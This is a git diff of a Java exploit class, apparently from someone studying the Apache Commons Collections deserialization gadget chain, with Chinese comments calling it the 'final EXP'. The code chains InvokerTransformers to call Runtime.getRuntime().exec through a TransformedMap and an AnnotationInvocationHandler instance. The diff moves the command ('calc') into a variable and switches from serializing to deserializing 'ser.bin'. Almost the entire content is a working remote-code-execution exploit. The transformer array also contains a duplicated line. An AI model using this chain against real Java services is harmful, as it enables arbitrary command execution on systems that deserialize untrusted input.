@@ -15,6 +15,7 @@ import java.util.Map;
 // 最终的 EXP
 public class TransformMapEXP {
     public static void main(String[] args) throws Exception{
+        String[] cmd = {"Calc"};
         Transformer[] transformers = new Transformer[]{
             new ConstantTransformer(Runtime.class),
             new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数
@@ -22,7 +23,7 @@ public class TransformMapEXP {
                     new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
             new InvokerTransformer("invoke"
                     , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
-            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
+            new InvokerTransformer("exec", new Class[]{String.class}, cmd)
         };
         ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
         HashMap<Object, Object> hashMap = new HashMap<>();
@@ -34,8 +35,8 @@ public class TransformMapEXP {
         Object o = aihConstructor.newInstance(Target.class, transformedMap);
 
         // 序列化反序列化
-        serialize(o);
-        //unserialize("ser.bin");
+//        serialize(o);
+        unserialize("ser.bin");
     }
     public static void serialize(Object obj) throws IOException {
         ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
